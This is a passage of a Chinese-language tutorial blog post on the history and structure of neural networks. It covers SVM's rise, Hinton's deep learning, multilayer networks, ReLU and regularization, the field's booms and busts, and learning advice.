&lt;p&gt;90年代中期，由Vapnik等人发明的SVM（Support Vector Machines，支持向量机）算法诞生，很快就在若干个方面体现出了对比神经网络的优势：无需调参；高效；全局最优解。基于以上种种理由，SVM迅速打败了神经网络算法成为主流。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/76f54c6c25dd5b7a0e6a482e2c704e70.jpg&quot; alt=&quot;&quot; width=&quot;122&quot; height=&quot;182&quot;&gt;&lt;/p&gt;
&lt;p&gt;图28 Vladimir Vapnik&lt;/p&gt;
&lt;p&gt;神经网络的研究再次陷入了冰河期。当时，只要你的论文中包含神经网络相关的字眼，非常容易被会议和期刊拒收，研究界那时对神经网络的不待见可想而知。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;fifth&quot;&gt;&lt;/a&gt;五. 多层神经网络（深度学习）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.引子&lt;/strong&gt;&lt;strong&gt;　&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在被人摒弃的10年中，有几个学者仍然在坚持研究。这其中的棋手就是加拿大多伦多大学的Geoffery Hinton教授。&lt;/p&gt;
&lt;p&gt;2006年，Hinton在《Science》和相关期刊上发表了论文，首次提出了“深度信念网络”的概念。与传统的训练方式不同，“深度信念网络”有一个“&lt;strong&gt;预训练&lt;/strong&gt;”（pre-training）的过程，这可以方便的让神经网络中的权值找到一个接近最优解的值，之后再使用“&lt;strong&gt;微调&lt;/strong&gt;”(fine-tuning)技术来对整个网络进行优化训练。这两个技术的运用大幅度减少了训练多层神经网络的时间。他给多层神经网络相关的学习方法赋予了一个新名词–“&lt;strong&gt;深度学习&lt;/strong&gt;”。&lt;/p&gt;
&lt;p&gt;很快，深度学习在语音识别领域暂露头角。接着，2012年，深度学习技术又在图像识别领域大展拳脚。Hinton与他的学生在ImageNet竞赛中，用多层的卷积神经网络成功地对包含一千类别的一百万张图片进行了训练，取得了分类错误率15%的好成绩，这个成绩比第二名高了近11个百分点，充分证明了多层神经网络识别效果的优越性。&lt;/p&gt;
&lt;p&gt;在这之后，关于深度神经网络的研究与应用不断涌现。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/183e47c4888c916604284330e7d47469.jpg&quot; alt=&quot;&quot; width=&quot;167&quot; height=&quot;223&quot;&gt;&lt;/p&gt;
&lt;p&gt;图29 Geoffery Hinton&lt;/p&gt;
&lt;p&gt;由于篇幅原因，本文不介绍CNN（Conventional Neural Network，卷积神经网络）与RNN（Recurrent Neural Network，递归神经网络）的架构，下面我们只讨论普通的多层神经网络。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们延续两层神经网络的方式来设计一个多层神经网络。&lt;/p&gt;
&lt;p&gt;在两层神经网络的输出层后面，继续添加层次。原来的输出层变成中间层，新加的层次成为新的输出层。所以可以得到下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/214eb96400a0ee9dcdd969f859b5d0c1.jpg&quot; alt=&quot;&quot; width=&quot;540&quot; height=&quot;351&quot;&gt;&lt;/p&gt;
&lt;p&gt;图30 多层神经网络&lt;/p&gt;
&lt;p&gt;依照这样的方式不断添加，我们可以得到更多层的多层神经网络。公式推导的话其实跟两层神经网络类似，使用矩阵运算的话就仅仅是加一个公式而已。&lt;/p&gt;
&lt;p&gt;在已知输入&lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt;，参数&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt;，&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;，&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(3)&lt;/sup&gt;的情况下，输出&lt;strong&gt;z&lt;/strong&gt;的推导公式如下：&lt;/p&gt;
&lt;p&gt;g(&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt; * &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt;) = &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;;&lt;/p&gt;
&lt;p&gt;g(&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt; * &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;) = &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(3)&lt;/sup&gt;;&lt;/p&gt;
&lt;p&gt;g(&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(3)&lt;/sup&gt; * &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(3)&lt;/sup&gt;) = &lt;strong&gt;z&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;多层神经网络中，输出也是按照一层一层的方式来计算。从最外面的层开始，算出所有单元的值以后，再继续计算更深一层。只有当前层所有单元的值都计算完毕以后，才会算下一层。有点像计算向前不断推进的感觉。所以这个过程叫做“正向传播”。&lt;/p&gt;
&lt;p&gt;下面讨论一下多层神经网络中的参数。&lt;/p&gt;
&lt;p&gt;首先我们看第一张图，可以看出&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt;中有6个参数，&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;中有4个参数，&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(3)&lt;/sup&gt;中有6个参数，所以整个神经网络中的参数有16个（这里我们不考虑偏置节点，下同）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/2b1875dfb4227d251471c7831398abaf.jpg&quot; alt=&quot;&quot; width=&quot;591&quot; height=&quot;463&quot;&gt;&lt;/p&gt;
&lt;p&gt;图31 多层神经网络（较少参数）&lt;/p&gt;
&lt;p&gt;假设我们将中间层的节点数做一下调整。第一个中间层改为3个单元，第二个中间层改为4个单元。&lt;/p&gt;
&lt;p&gt;经过调整以后，整个网络的参数变成了33个。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/1fa52e0d54c28e546c58cea30f6ee904.jpg&quot; alt=&quot;&quot; width=&quot;626&quot; height=&quot;496&quot;&gt;&lt;/p&gt;
&lt;p&gt;图32 多层神经网络（较多参数）&lt;/p&gt;
&lt;p&gt;虽然层数保持不变，但是第二个神经网络的参数数量却是第一个神经网络的接近两倍之多，从而带来了更好的表示（represention）能力。表示能力是多层神经网络的一个重要性质，下面会做介绍。&lt;/p&gt;
&lt;p&gt;在参数一致的情况下，我们也可以获得一个“更深”的网络。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/f6536fedabce38809ddbdebe1f1178e7.jpg&quot; alt=&quot;&quot; width=&quot;681&quot; height=&quot;454&quot;&gt;&lt;/p&gt;
&lt;p&gt;图33 多层神经网络（更深的层次）&lt;/p&gt;
&lt;p&gt;上图的网络中，虽然参数数量仍然是33，但却有4个中间层，是原来层数的接近两倍。这意味着一样的参数数量，可以用更深的层次去表达。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;与两层层神经网络不同。多层神经网络中的层数增加了很多。&lt;/p&gt;
&lt;p&gt;增加更多的层次有什么好处？更深入的表示特征，以及更强的函数模拟能力。&lt;/p&gt;
&lt;p&gt;更深入的表示特征可以这样理解，随着网络的层数增加，每一层对于前一层次的抽象表示更深入。在神经网络中，每一层神经元学习到的是前一层神经元值的更抽象的表示。例如第一个隐藏层学习到的是“边缘”的特征，第二个隐藏层学习到的是由“边缘”组成的“形状”的特征，第三个隐藏层学习到的是由“形状”组成的“图案”的特征，最后的隐藏层学习到的是由“图案”组成的“目标”的特征。通过抽取更抽象的特征来对事物进行区分，从而获得更好的区分与分类能力。&lt;/p&gt;
&lt;p&gt;关于逐层特征学习的例子，可以参考下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/3661d4082dabc6d75c6b498c4dbac4a0.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;图34 多层神经网络（特征学习）&lt;/p&gt;
&lt;p&gt;更强的函数模拟能力是由于随着层数的增加，整个网络的参数就越多。而神经网络其实本质就是模拟特征与目标之间的真实关系函数的方法，更多的参数意味着其模拟的函数可以更加的复杂，可以有更多的&lt;strong&gt;容量&lt;/strong&gt;（capcity）去拟合真正的关系。&lt;/p&gt;
&lt;p&gt;通过研究发现，在参数数量一样的情况下，更深的网络往往具有比浅层的网络更好的识别效率。这点也在ImageNet的多次大赛中得到了证实。从2012年起，每年获得ImageNet冠军的深度神经网络的层数逐年增加，2015年最好的方法GoogleNet是一个多达22层的神经网络。&lt;/p&gt;
&lt;p&gt;在最新一届的ImageNet大赛上，目前拿到最好成绩的MSRA团队的方法使用的更是一个深达152层的网络！关于这个方法更多的信息有兴趣的可以查阅ImageNet网站。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.训练&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在单层神经网络时，我们使用的激活函数是sgn函数。到了两层神经网络时，我们使用的最多的是sigmoid函数。而到了多层神经网络时，通过一系列的研究发现，ReLU函数在训练多层神经网络时，更容易收敛，并且预测性能更好。因此，目前在深度学习中，最流行的非线性函数是ReLU函数。ReLU函数不是传统的非线性函数，而是分段线性函数。其表达式非常简单，就是y=max(x,0)。简而言之，在x大于0，输出就是输入，而在x小于0时，输出就保持为0。这种函数的设计启发来自于生物神经元对于激励的线性响应，以及当低于某个阈值后就不再响应的模拟。&lt;/p&gt;
&lt;p&gt;在多层神经网络中，训练的主题仍然是优化和泛化。当使用足够强的计算芯片（例如GPU图形加速卡）时，梯度下降算法以及反向传播算法在多层神经网络中的训练中仍然工作的很好。目前学术界主要的研究既在于开发新的算法，也在于对这两个算法进行不断的优化，例如，增加了一种带动量因子（momentum）的梯度下降算法。&lt;/p&gt;
&lt;p&gt;在深度学习中，泛化技术变的比以往更加的重要。这主要是因为神经网络的层数增加了，参数也增加了，表示能力大幅度增强，很容易出现&lt;strong&gt;过拟合现象&lt;/strong&gt;。因此正则化技术就显得十分重要。目前，Dropout技术，以及数据扩容（Data-Augmentation）技术是目前使用的最多的正则化技术。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5.影响&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目前，深度神经网络在人工智能界占据统治地位。但凡有关人工智能的产业报道，必然离不开深度学习。神经网络界当下的四位引领者除了前文所说的Ng，Hinton以外，还有CNN的发明人Yann Lecun，以及《Deep Learning》的作者Bengio。&lt;/p&gt;
&lt;p&gt;前段时间一直对人工智能持谨慎态度的马斯克，搞了一个&lt;a href=&quot;http://news.cnblogs.com/n/534878/&quot; target=&quot;_blank&quot;&gt;OpenAI项目&lt;/a&gt;，邀请Bengio作为高级顾问。马斯克认为，人工智能技术不应该掌握在大公司如Google，Facebook的手里，更应该作为一种开放技术，让所有人都可以参与研究。马斯克的这种精神值得让人敬佩。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/9798c2058d1935cc3dac5dabad1b983c.jpg&quot; alt=&quot;&quot; width=&quot;160&quot; height=&quot;188&quot;&gt;   &lt;img src=&quot;/images/jobbole.com/c27c9ea3edb7503b2ec07f65f77bf282.jpg&quot; alt=&quot;&quot; width=&quot;166&quot; height=&quot;189&quot;&gt;&lt;/p&gt;
&lt;p&gt;图35 Yann LeCun（左）和 Yoshua Bengio（右）&lt;/p&gt;
&lt;p&gt;多层神经网络的研究仍在进行中。现在最为火热的研究技术包括RNN，LSTM等，研究方向则是图像理解方面。图像理解技术是给计算机一幅图片，让它用语言来表达这幅图片的意思。ImageNet竞赛也在不断召开，有更多的方法涌现出来，刷新以往的正确率。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;sixth&quot;&gt;&lt;/a&gt;六. 回顾&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.影响&lt;/strong&gt;&lt;strong&gt;　&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们回顾一下神经网络发展的历程。神经网络的发展历史曲折荡漾，既有被人捧上天的时刻，也有摔落在街头无人问津的时段，中间经历了数次大起大落。&lt;/p&gt;
&lt;p&gt;从单层神经网络（感知器）开始，到包含一个隐藏层的两层神经网络，再到多层的深度神经网络，一共有三次兴起过程。详见下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/08ef92aea918cd0283bf3d2849559472.jpg&quot; alt=&quot;&quot; width=&quot;964&quot; height=&quot;523&quot;&gt;&lt;/p&gt;
&lt;p&gt;图36 三起三落的神经网络&lt;/p&gt;
&lt;p&gt;上图中的顶点与谷底可以看作神经网络发展的高峰与低谷。图中的横轴是时间，以年为单位。纵轴是一个神经网络影响力的示意表示。如果把1949年Hebb模型提出到1958年的感知机诞生这个10年视为落下（没有兴起）的话，那么神经网络算是经历了“三起三落”这样一个过程，跟“小平”同志类似。俗话说，天将降大任于斯人也，必先苦其心志，劳其筋骨。经历过如此多波折的神经网络能够在现阶段取得成功也可以被看做是磨砺的积累吧。&lt;/p&gt;
&lt;p&gt;历史最大的好处是可以给现在做参考。科学的研究呈现螺旋形上升的过程，不可能一帆风顺。同时，这也给现在过分热衷深度学习与人工智能的人敲响警钟，因为这不是第一次人们因为神经网络而疯狂了。1958年到1969年，以及1985年到1995，这两个十年间人们对于神经网络以及人工智能的期待并不现在低，可结果如何大家也能看的很清楚。&lt;/p&gt;
&lt;p&gt;因此，冷静才是对待目前深度学习热潮的最好办法。如果因为深度学习火热，或者可以有“钱景”就一窝蜂的涌入，那么最终的受害人只能是自己。神经网络界已经两次有被人们捧上天了的境况，相信也对于捧得越高，摔得越惨这句话深有体会。因此，神经网络界的学者也必须给这股热潮浇上一盆水，不要让媒体以及投资家们过分的高看这门技术。很有可能，三十年河东，三十年河西，在几年后，神经网络就再次陷入谷底。根据上图的历史曲线图，这是很有可能的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.效果&lt;/strong&gt;&lt;strong&gt;　&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面说一下神经网络为什么能这么火热？简而言之，就是其学习效果的强大。随着神经网络的发展，其表示性能越来越强。&lt;/p&gt;
&lt;p&gt;从单层神经网络，到两层神经网络，再到多层神经网络，下图说明了，随着网络层数的增加，以及激活函数的调整，神经网络所能拟合的决策分界平面的能力。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/805e9ea2ccb94db5c1969d5e8e5a6b7e.jpg&quot; alt=&quot;&quot; width=&quot;984&quot; height=&quot;653&quot;&gt;&lt;/p&gt;
&lt;p&gt;图37 表示能力不断增强&lt;/p&gt;
&lt;p&gt;可以看出，随着层数增加，其非线性分界拟合能力不断增强。图中的分界线并不代表真实训练出的效果，更多的是示意效果。&lt;/p&gt;
&lt;p&gt;神经网络的研究与应用之所以能够不断地火热发展下去，与其强大的函数拟合能力是分不开关系的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.外因&lt;/strong&gt;&lt;strong&gt;　&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当然，光有强大的内在能力，并不一定能成功。一个成功的技术与方法，不仅需要内因的作用，还需要时势与环境的配合。神经网络的发展背后的外在原因可以被总结为：更强的计算性能，更多的数据，以及更好的训练方法。只有满足这些条件时，神经网络的函数拟合能力才能得已体现，见下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/8ea96fd323452398e0f42199c57bf7a8.jpg&quot; alt=&quot;&quot; width=&quot;857&quot; height=&quot;537&quot;&gt;&lt;/p&gt;
&lt;p&gt;图38 发展的外在原因&lt;/p&gt;
&lt;p&gt;之所以在单层神经网络年代，Rosenblat无法制作一个双层分类器，就在于当时的计算性能不足，Minsky也以此来打压神经网络。但是Minsky没有料到，仅仅10年以后，计算机CPU的快速发展已经使得我们可以做两层神经网络的训练，并且还有快速的学习算法BP。&lt;/p&gt;
&lt;p&gt;但是在两层神经网络快速流行的年代。更高层的神经网络由于计算性能的问题，以及一些计算方法的问题，其优势无法得到体现。直到2012年，研究人员发现，用于高性能计算的图形加速卡（GPU）可以极佳地匹配神经网络训练所需要的要求：高并行性，高存储，没有太多的控制需求，配合预训练等算法，神经网络才得以大放光彩。&lt;/p&gt;
&lt;p&gt;互联网时代，大量的数据被收集整理，更好的训练方法不断被发现。所有这一切都满足了多层神经网络发挥能力的条件。&lt;/p&gt;
&lt;p&gt;“时势造英雄”，正如Hinton在2006年的论文里说道的&lt;/p&gt;
&lt;p&gt;“&lt;strong&gt;… provided that computers were fast enough, data sets were big enough, and the initial weights were close enough to a good solution. All three conditions are now satisfied.&lt;/strong&gt;”，&lt;/p&gt;
&lt;p&gt;外在条件的满足也是神经网络从神经元得以发展到目前的深度神经网络的重要因素。&lt;/p&gt;
&lt;p&gt;除此以外，一门技术的发扬没有“伯乐”也是不行的。在神经网络漫长的历史中，正是由于许多研究人员的锲而不舍，不断钻研，才能有了现在的成就。前期的Rosenblat，Rumelhart没有见证到神经网络如今的流行与地位。但是在那个时代，他们为神经网络的发展所打下的基础，却会永远流传下去，不会退色。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;seventh&quot;&gt;&lt;/a&gt;七. 展望&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;1.量子计算&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;回到我们对神经网络历史的讨论，根据历史趋势图来看，神经网络以及深度学习会不会像以往一样再次陷入谷底？作者认为，这个过程可能取决于量子计算机的发展。&lt;/p&gt;
&lt;p&gt;根据一些最近的研究发现，人脑内部进行的计算可能是类似于量子计算形态的东西。而且目前已知的最大神经网络跟人脑的神经元数量相比，仍然显得非常小，仅不及1%左右。所以未来真正想实现人脑神经网络的模拟，可能需要借助量子计算的强大计算能力。&lt;/p&gt;
&lt;p&gt;各大研究组也已经认识到了量子计算的重要性。谷歌就在开展量子计算机D-wave的研究，希望用量子计算来进行机器学习，并且在前段时间有了突破性的&lt;a href=&quot;http://news.cnblogs.com/n/535307/&quot; target=&quot;_blank&quot;&gt;进展&lt;/a&gt;。国内方面，阿里和中科院合作成立了&lt;a href=&quot;http://news.sciencenet.cn/htmlnews/2015/7/323963.shtm&quot; target=&quot;_blank&quot;&gt;量子计算实验室&lt;/a&gt;，意图进行量子计算的研究。&lt;/p&gt;
&lt;p&gt;如果量子计算发展不力，仍然需要数十年才能使我们的计算能力得以突飞猛进的发展，那么缺少了强大计算能力的神经网络可能会无法一帆风顺的发展下去。这种情况可以类比为80-90年时期神经网络因为计算能力的限制而被低估与忽视。假设量子计算机真的能够与神经网络结合，并且助力真正的人工智能技术的诞生，而且量子计算机发展需要10年的话，那么神经网络可能还有10年的发展期。直到那时期以后，神经网络才能真正接近实现AI这一目标。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/bbfd7600094f6433c07ab1135df2514d.jpg&quot; alt=&quot;&quot; width=&quot;419&quot; height=&quot;329&quot;&gt;&lt;/p&gt;
&lt;p&gt;图39 量子计算&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;2.人工智能&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最后，作者想简单地谈谈对目前人工智能的看法。虽然现在人工智能非常火热，但是距离真正的人工智能还有很大的距离。就拿计算机视觉方向来说，面对稍微复杂一些的场景，以及易于混淆的图像，计算机就可能难以识别。因此，这个方向还有很多的工作要做。&lt;/p&gt;
&lt;p&gt;就普通人看来，这么辛苦的做各种实验，以及投入大量的人力就是为了实现一些不及孩童能力的视觉能力，未免有些不值。但是这只是第一步。虽然计算机需要很大的运算量才能完成一个普通人简单能完成的识图工作，但计算机最大的优势在于并行化与批量推广能力。使用计算机以后，我们可以很轻易地将以前需要人眼去判断的工作交给计算机做，而且几乎没有任何的推广成本。这就具有很大的价值。正如火车刚诞生的时候，有人嘲笑它又笨又重，速度还没有马快。但是很快规模化推广的火车就替代了马车的使用。人工智能也是如此。这也是为什么目前世界上各著名公司以及政府都对此热衷的原因。&lt;/p&gt;
&lt;p&gt;目前看来，神经网络要想实现人工智能还有很多的路要走，但方向至少是正确的，下面就要看后来者的不断努力了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/e5f7d9f6cbc226ead7ab0ea942aa30ba.jpg&quot; alt=&quot;&quot; width=&quot;420&quot; height=&quot;280&quot;&gt;&lt;/p&gt;
&lt;p&gt;图40 人工智能&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;eighth&quot;&gt;&lt;/a&gt;八 总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;本文回顾了神经网络的发展历史，从神经元开始，历经单层神经网络，两层神经网络，直到多层神经网络。在历史介绍中穿插讲解神经网络的结构，分类效果以及训练方法等。本文说明了神经网络内部实际上就是矩阵计算，在程序中的实现没有“点”和“线”的对象。本文说明了神经网络强大预测能力的根本，就是多层的神经网络可以无限逼近真实的对应函数，从而模拟数据之间的真实关系。除此之外，本文回顾了神经网络发展的历程，分析了神经网络发展的外在原因，包括计算能力的增强，数据的增多，以及方法的创新等。最后，本文对神经网络的未来进行了展望，包括量子计算与神经网络结合的可能性，以及探讨未来人工智能发展的前景与价值。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;nineth&quot;&gt;&lt;/a&gt;九. 后记&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;本篇文章可以视为作者一年来对神经网络的理解与总结，包括实验的体会，书籍的阅读，以及思考的火花等。神经网络虽然重要，但学习并不容易。这主要是由于其结构图较为难懂，以及历史发展的原因，导致概念容易混淆，一些介绍的博客与网站内容新旧不齐。本篇文章着眼于这些问题，没有太多的数学推导，意图以一种简单的，直观的方式对神经网络进行讲解。在2015年最后一天终于写完。希望本文可以对各位有所帮助。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;作者很感谢能够阅读到这里的读者。如果看完觉得好的话，还请轻轻点一下赞，你们的鼓励就是作者继续行文的动力。本文的备注部分是一些对神经网络学习的建议，供补充阅读与参考。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;目前为止，&lt;a href=&quot;https://github.com/liuruoze/EasyPR&quot; target=&quot;_blank&quot;&gt;EasyPR&lt;/a&gt;的1.4版已经将神经网络（ANN）训练的模块加以开放，开发者们可以使用这个模块来进行自己的字符模型的训练。有兴趣的可以&lt;a href=&quot;https://github.com/liuruoze/EasyPR&quot; target=&quot;_blank&quot;&gt;下载&lt;/a&gt;。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;tenth&quot;&gt;&lt;/a&gt;十. 备注&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;神经网络虽然很重要，但是对于神经网络的学习，却并不容易。这些学习困难主要来自以下三个方面：概念，类别，教程。下面简单说明这三点。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.概念&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于一门技术的学习而言，首先最重要的是弄清概念。只有将概念理解清楚，才能顺畅的进行后面的学习。由于神经网络漫长的发展历史，经常会有一些概念容易混淆，让人学习中产生困惑。这里面包括历史的术语，不一致的说法，以及被遗忘的研究等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;历史的术语&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个的代表就是多层感知器（MLP）这个术语。起初看文献时很难理解的一个问题就是，为什么神经网络又有另一个名称：MLP。其实MLP（Multi-Layer Perceptron）的名称起源于50-60年代的感知器（Perceptron）。由于我们在感知器之上又增加了一个计算层，因此称为多层感知器。值得注意的是，虽然叫“多层”，MLP一般都指的是两层（带一个隐藏层的）神经网络。&lt;/p&gt;
&lt;p&gt;MLP这个术语属于历史遗留的产物。现在我们一般就说神经网络，以及深度神经网络。前者代表带一个隐藏层的两层神经网络，也是EasyPR目前使用的识别网络，后者指深度学习的网络。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不一致的说法&lt;br&gt;
&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个最明显的代表就是损失函数loss function，这个还有两个说法是跟它完全一致的意思，分别是残差函数error function，以及代价函数cost function。loss function是目前深度学习里用的较多的一种说法，caffe里也是这么叫的。cost function则是Ng在coursera教学视频里用到的统一说法。这三者都是同一个意思，都是优化问题所需要求解的方程。虽然在使用的时候不做规定，但是在听到各种讲解时要心里明白。&lt;/p&gt;
&lt;p&gt;再来就是权重weight和参数parameter的说法，神经网络界由于以前的惯例，一般会将训练得到的参数称之为权重，而不像其他机器学习方法就称之为参数。这个需要记住就好。不过在目前的使用惯例中，也有这样一种规定。那就是非偏置节点连接上的值称之为权重，而偏置节点上的值称之为偏置，两者统一起来称之为参数。&lt;/p&gt;
&lt;p&gt;另外一个同义词就是激活函数active function和转移函数transfer function了。同样，他们代表一个意思，都是叠加的非线性函数的说法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;被遗忘的研究&lt;br&gt;
&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于神经网络发展历史已经有70年的漫长历史，因此在研究过程中，必然有一些研究分支属于被遗忘阶段。这里面包括各种不同的网络，例如SOM（Self-Organizing Map，自组织特征映射网络），SNN（Synergetic Neural Network，协同神经网络），ART（Adaptive Resonance Theory，自适应共振理论网络）等等。所以看历史文献时会看到许多没见过的概念与名词。&lt;/p&gt;
&lt;p&gt;有些历史网络甚至会重新成为新的研究热点，例如RNN与LSTM就是80年代左右开始的研究，目前已经是深度学习研究中的重要一门技术，在语音与文字识别中有很好的效果。&lt;/p&gt;
&lt;p&gt;对于这些易于混淆以及弄错的概念，务必需要多方参考文献，理清上下文，这样才不会在学习与阅读过程中迷糊。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.类别&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面谈一下关于神经网络中的不同类别。&lt;/p&gt;
&lt;p&gt;其实本文的名字“神经网络浅讲”并不合适，因为本文并不是讲的是“神经网络”的内容，而是其中的一个子类，也是目前最常说的&lt;strong&gt;前馈神经网络&lt;/strong&gt;。根据下图的分类可以看出。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/d200689565f118fcd410eb532c2931e3.jpg&quot; alt=&quot;&quot; width=&quot;839&quot; height=&quot;371&quot;&gt;&lt;/p&gt;
&lt;p&gt;图41 神经网络的类别&lt;/p&gt;
&lt;p&gt;神经网络其实是一个非常宽泛的称呼，它包括两类，一类是用计算机的方式去模拟人脑，这就是我们常说的ANN（人工神经网络），另一类是研究生物学上的神经网络，又叫生物神经网络。对于我们计算机人士而言，肯定是研究前者。&lt;/p&gt;
&lt;p&gt;在人工神经网络之中，又分为前馈神经网络和反馈神经网络这两种。那么它们两者的区别是什么呢？这个其实在于它们的结构图。我们可以把结构图看作是一个有向图。其中神经元代表顶点，连接代表有向边。对于前馈神经网络中，这个有向图是没有回路的。你可以仔细观察本文中出现的所有神经网络的结构图，确认一下。而对于反馈神经网络中，结构图的有向图是有回路的。反馈神经网络也是一类重要的神经网络。其中Hopfield网络就是反馈神经网络。深度学习中的RNN也属于一种反馈神经网络。&lt;/p&gt;
&lt;p&gt;具体到前馈神经网络中，就有了本文中所分别描述的三个网络：单层神经网络，双层神经网络，以及多层神经网络。深度学习中的CNN属于一种特殊的多层神经网络。另外，在一些Blog中和文献中看到的BP神经网络是什么？其实它们就是使用了反向传播BP算法的两层前馈神经网络。也是最普遍的一种两层神经网络。&lt;/p&gt;
&lt;p&gt;通过以上分析可以看出，神经网络这种说法其实是非常广义的，具体在文章中说的是什么网络，需要根据文中的内容加以区分。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.教程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如何更好的学习神经网络，认真的学习一门课程或者看一本著作都是很有必要的。&lt;/p&gt;
&lt;p&gt;说到网络教程的话，这里必须说一下Ng的机器学习课程。对于一个初学者而言，Ng的课程视频是非常有帮助的。Ng一共开设过两门机器学习公开课程：一个是2003年在Standford开设的，面向全球的学生，这个视频现在可以在网易公开课上找到；另一个是2010年专门为Coursera上的用户开设的，需要登陆Coursera上才能学习。&lt;/p&gt;
&lt;p&gt;但是，需要注意点是，这两个课程对待神经网络的态度有点不同。早些的课程一共有20节课，Ng花了若干节课去专门讲SVM以及SVM的推导，而当时的神经网络，仅仅放了几段视频，花了大概不到20分钟（一节课60分钟左右）。而到了后来的课程时，总共10节的课程中，Ng给了完整的两节给神经网络，详细介绍了神经网络的反向传播算法。同时给SVM只有一节课，并且没有再讲SVM的推导过程。下面两张图分别是Ng介绍神经网络的开篇，可以大致看出一些端倪。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/ea2a4ec8c3a86433c3ad49f7e75c9fbb.jpg&quot; alt=&quot;&quot; width=&quot;854&quot; height=&quot;413&quot;&gt;&lt;/p&gt;
&lt;p&gt;图42 Ng与神经网络&lt;/p&gt;
&lt;p&gt;为什么Ng对待神经网络的反应前后相差那么大？事实上就是深度学习的原因。Ng实践了深度学习的效果，认识到深度学习的基础–神经网络的重要性。这就是他在后面重点介绍神经网络的原因。总之，对于神经网络的学习而言，我更推荐Coursera上的。因为在那个时候，Ng才是真正的把神经网络作为一门重要的机器学习方法去传授。你可以从他上课的态度中感受到他的重视，以及他希望你能学好的期望。&lt;/p&gt;
